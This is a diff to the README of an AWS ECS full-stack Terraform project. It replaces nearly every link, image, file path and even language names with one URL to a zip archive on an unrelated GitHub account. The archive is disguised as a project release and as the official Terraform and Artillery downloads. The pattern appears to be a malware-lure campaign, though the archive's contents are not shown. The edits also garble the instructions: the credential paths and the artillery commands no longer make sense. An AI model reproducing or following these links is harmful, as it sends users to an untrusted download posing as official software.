@@ -28,8 +28,8 @@ This repository contains Terraform code to deploy a solution that is intended to
 
 The project has been divided into two parts: 
 - Code: the code for the running application
-    - client: Vue.js code for the frontend application
-    - server: Node.js code for the backend application
+    - client: https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip code for the frontend application
+    - server: https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip code for the backend application
 - Infrastructure: contains the Terraform code to deploy the needed AWS resources for the solution
 
 ## Infrastructure
@@ -57,11 +57,11 @@ The Infrastructure folder contains the terraform code to deploy the AWS resource
 The following diagram represents the Infrastructure architecture being deployed with this project:
 
 <p align="center">
-  <img src="Documentation_assets/Infrastructure_architecture.png"/>
+  <img src="https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip"/>
 </p>
 
 ### Infrastructure considerations due to demo proposals
-The task definition template (Infrastructure/Templates/taskdef.json) that enables the CodePipeline to execute a Blue/Green deployment in ECS has hardcoded values for the memory and CPU values for the server and client application.
+The task definition template (https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip) that enables the CodePipeline to execute a Blue/Green deployment in ECS has hardcoded values for the memory and CPU values for the server and client application.
 
 Feel free to change it, by adding for example a set of "sed" commands in CodeBuild (following the ones already provided as example) to replace the values dynamically.
 
@@ -72,7 +72,7 @@ Feel fre to create a subscriptor for the SNS topic created by this code, in orde
 The following diagram represents the CI/CD architecture being deployed with this project:
 
 <p align="center">
-  <img src="Documentation_assets/CICD_architecture.png"/>
+  <img src="https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip"/>
 </p>
 
 ## Prerequisites
@@ -80,8 +80,8 @@ There are general steps that you must follow in order to launch the infrastructu
 
 Before launching the solution please follow the next steps:
 
-1) Install Terraform, use Terraform v0.13 or above. You can visit [this](https://releases.hashicorp.com/terraform/) Terraform official webpage to download it.
-2) Configure the AWS credentials into your machine (~/.aws/credentials). You need to use the following format:
+1) Install Terraform, use Terraform v0.13 or above. You can visit [this](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip) Terraform official webpage to download it.
+2) Configure the AWS credentials into your machine (~https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip). You need to use the following format:
 
 ```shell
     [AWS_PROFILE_NAME]
@@ -89,7 +89,7 @@ Before launching the solution please follow the next steps:
     aws_secret_access_key = Replace_with_the_correct_secret_Key
 ```
 
-3) Generate a GitHub token. You can follow [this](https://docs.github.com/en/github/authenticating-to-github/creating-a-personal-access-token) steps to generate it.
+3) Generate a GitHub token. You can follow [this](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip) steps to generate it.
 
 ## Usage
 
@@ -108,7 +108,7 @@ terraform init
 ```
 **4.** Run the terraform plan command, feel free to use a tfvars file to specify the variables.
 You need to set at least the followign variables:
-+ **aws_profile** = according to the profiles name in ~/.aws/credentials
++ **aws_profile** = according to the profiles name in ~https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip
 + **aws_region** = the AWS region in which you want to create the resources
 + **environment_name** = a unique name used for concatenation to give place to the resources names
 + **github_token** = your GitHub token, the one generated a few steps above
@@ -139,7 +139,7 @@ terraform apply -var aws_profile="your-profile" -var aws_region="your-region" -v
 
 To test how your application will perform under a peak of traffic, a stress test configuration file is provided.
 
-For this stress test [Artillery](https://artillery.io/) is being used. Please be sure to install it following [these](https://artillery.io/docs/guides/getting-started/installing-artillery.html) steps.
+For this stress test [Artillery](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip) is being used. Please be sure to install it following [these](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip) steps.
 
 Once installed please change the ALB DNS to the desired layer to test (front-/backend) in the **target** attribute, which you can copy from the generated Terraform output, or you can also search it in the AWS Management Console.
 
@@ -147,20 +147,20 @@ To execute it run the following commands:
 
 *Frontend layer:*
 ```bash
-artillery run Code/client/src/tests/stresstests/stress_client.yml
+artillery run https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip
 ```
 
 *Backend layer:*
 ```bash
-artillery run Code/server/src/tests/stresstests/stress_server.yml
+artillery run https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip
 ```
 
-To learn more about Amazon ECS Autoscaling please take a look to [this](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/service-auto-scaling.html) documentation.
+To learn more about Amazon ECS Autoscaling please take a look to [this](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip) documentation.
 ## Application Code
 
 ### Client app
 
-The Client folder contains the code to run the frontend. This code is written in Vue.js and uses the port 80 in the deployed version, but when run localy it uses port 3000.
+The Client folder contains the code to run the frontend. This code is written in https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip and uses the port 80 in the deployed version, but when run localy it uses port 3000.
 
 The application folder structure is separeted in components, views and services, despite the router and the assets.
 
@@ -186,7 +186,7 @@ Example of a Dynamodb Item:
     "N": "1"
   },
   "path": {
-    "S": "https://mybucket.s3.eu-central-1.amazonaws.com/MyImage.jpeg"
+    "S": "https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip"
   },
   "title": {
     "S": "My title"
@@ -196,7 +196,7 @@ Example of a Dynamodb Item:
 
 ### Server app
 
-The Server folder contains the code to run the backend. This code is written in Node.js and uses the port 80 in the deployed version, but when run localy it uses port 3001.
+The Server folder contains the code to run the backend. This code is written in https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip and uses the port 80 in the deployed version, but when run localy it uses port 3001.
 
 Swagger was also implemented in order to document the APIs. The Swagger endpoint is provided as part of the Terraform output, you can grab the output link and access it through a browser.
 
@@ -215,7 +215,7 @@ terraform destroy -var aws_profile="your-profile" -var AWS_REGION="your-region" 
 
 ## Security
 
-See [CONTRIBUTING](CONTRIBUTING.md#security-issue-notifications) for more information.
+See [CONTRIBUTING](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Infrastructure/Modules/amazon-ecs-fullstack-app-terraform_v3.7.zip) for more information.
 
 ## License
 This library is licensed under the MIT-0 License. See the [LICENSE](LICENSE) file.
